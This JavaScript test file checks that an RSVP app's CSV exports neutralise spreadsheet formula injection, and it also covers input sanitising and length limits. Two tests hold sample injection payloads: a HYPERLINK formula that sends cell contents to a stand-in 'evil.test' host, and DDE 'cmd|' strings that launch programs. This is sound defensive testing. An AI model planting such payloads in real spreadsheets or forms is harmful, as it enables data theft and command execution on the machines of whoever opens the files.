"use strict";

/**
 * Spreadsheet formula injection: guest-supplied text ends up in the admin CSV
 * export, which gets opened in Excel / Sheets. Nothing from a guest may arrive
 * in a form that a spreadsheet will evaluate.
 */

const test = require("node:test");
const assert = require("node:assert");
const request = require("supertest");

const { open } = require("../lib/db");
const { createApp } = require("../lib/app");
const { exportResponsesToCsv, exportCatererCsv, csvSafe } = require("../lib/csv");

const CSRF = ["X-Requested-With", "XMLHttpRequest"];

function setup() {
  const store = open(":memory:");
  const app = createApp({ store, sendEmail: async () => ({ id: "x" }), config: { sessionSecret: "t" } });
  return { store, app };
}

async function rsvpAs(app, code, payload) {
  const agent = request.agent(app);
  await agent.post("/api/lookup").set(...CSRF).send({ code });
  return agent.post("/api/rsvp").set(...CSRF).send(payload);
}

test("csvSafe neutralizes every formula-triggering lead character", () => {
  for (const lead of ["=", "+", "-", "@", "\t", "\r"]) {
    assert.equal(csvSafe(`${lead}payload`), `'${lead}payload`);
  }
});

test("csvSafe leaves ordinary values untouched", () => {
  for (const v of ["Alice Adams", "Renée O'Brien-Smith", "José García", "李雷", "no nuts, please"]) {
    assert.equal(csvSafe(v), v);
  }
  assert.equal(csvSafe(null), "");
});

test("a formula in a guest name never reaches the export unescaped", async () => {
  const { store, app } = setup();
  const inv = store.createInvitee({ name: "Mallory Mills", plus_ones_allotted: 1, invite_code: "1000000001" });

  const res = await rsvpAs(app, "1000000001", {
    attending: true,
    email: "m@example.com",
    attendees: [{ name: '=HYPERLINK("http://evil.test?x="&A1,"click")', dietary: "=cmd|'/c calc'!A0" }],
  });
  // Rejected outright: that "name" contains no letters or digits.
  assert.equal(res.status, 400);
  assert.equal(store.getRsvpByInviteeId(inv.id), null);
});

test("a formula appended to a real name is exported as inert text", async () => {
  const { store, app } = setup();
  store.createInvitee({ name: "Mallory Mills", plus_ones_allotted: 1, invite_code: "1000000001" });

  const res = await rsvpAs(app, "1000000001", {
    attending: true,
    email: "m@example.com",
    message: "=1+1",
    attendees: [{ name: "Mallory Mills", dietary: "@SUM(1+1)*cmd|'/c calc'!A0" }],
  });
  assert.equal(res.status, 200);

  const csv = exportResponsesToCsv(store);
  for (const line of csv.split("\n").slice(1).filter(Boolean)) {
    for (const cell of line.split(",")) {
      const text = cell.replace(/^"|"$/g, "");
      assert.equal(/^[=+\-@\t\r]/.test(text), false, `evaluable cell in export: ${cell}`);
    }
  }
  assert.match(csv, /'@SUM/);
  assert.match(csv, /'=1\+1/);
});

test("the caterer export escapes guest-supplied dietary notes", async () => {
  const { store, app } = setup();
  store.createInvitee({ name: "Cat Erer", plus_ones_allotted: 1, invite_code: "1000000001" });

  const res = await rsvpAs(app, "1000000001", {
    attending: true,
    email: "c@example.com",
    attendees: [{ name: "Cat Erer", dietary: "=1+1" }],
  });
  assert.equal(res.status, 200);

  const csv = exportCatererCsv(store);
  for (const line of csv.split("\n").slice(1).filter(Boolean)) {
    const first = line.split(",")[0].replace(/^"|"$/g, "");
    assert.equal(/^[=+\-@\t\r]/.test(first), false, `evaluable cell in caterer export: ${line}`);
  }
  assert.match(csv, /'=1\+1/);
});

test("control characters are stripped from guest input", async () => {
  const { store, app } = setup();
  const inv = store.createInvitee({ name: "Nina Novak", plus_ones_allotted: 1, invite_code: "1000000002" });

  const res = await rsvpAs(app, "1000000002", {
    attending: true,
    email: "n@example.com",
    attendees: [{ name: "Nina\u0000\u200B\tNovak", dietary: "gluten\rfree" }],
  });
  assert.equal(res.status, 200);

  const saved = store.getRsvpByInviteeId(inv.id);
  assert.equal(saved.attendees[0].name, "Nina Novak");
  assert.equal(saved.attendees[0].dietary, "gluten free");
});

test("international names and punctuation are accepted unchanged", async () => {
  const { store, app } = setup();
  const inv = store.createInvitee({ name: "Renée O'Brien-Smith", plus_ones_allotted: 3, invite_code: "1000000003" });

  const names = ["Renée O'Brien-Smith", "José García", "J.R. Smith", "李雷"];
  const res = await rsvpAs(app, "1000000003", {
    attending: true,
    email: "r@example.com",
    attendees: names.map((name) => ({ name })),
  });
  assert.equal(res.status, 200);

  const saved = store.getRsvpByInviteeId(inv.id);
  assert.deepEqual(saved.attendees.map((a) => a.name).sort(), [...names].sort());
});

test("over-long input is capped rather than rejected", async () => {
  const { store, app } = setup();
  const inv = store.createInvitee({ name: "Long Lars", invite_code: "1000000004" });

  const res = await rsvpAs(app, "1000000004", {
    attending: true,
    email: "l@example.com",
    message: "m".repeat(5000),
    attendees: [{ name: "L".repeat(500) }],
  });
  assert.equal(res.status, 200);

  const saved = store.getRsvpByInviteeId(inv.id);
  assert.equal(saved.attendees[0].name.length, 80);
  assert.equal(saved.message.length, 2000);
});
